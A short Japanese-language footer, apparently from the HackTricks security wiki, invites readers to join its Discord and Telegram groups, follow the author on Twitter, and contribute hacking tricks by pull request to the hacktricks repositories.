* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
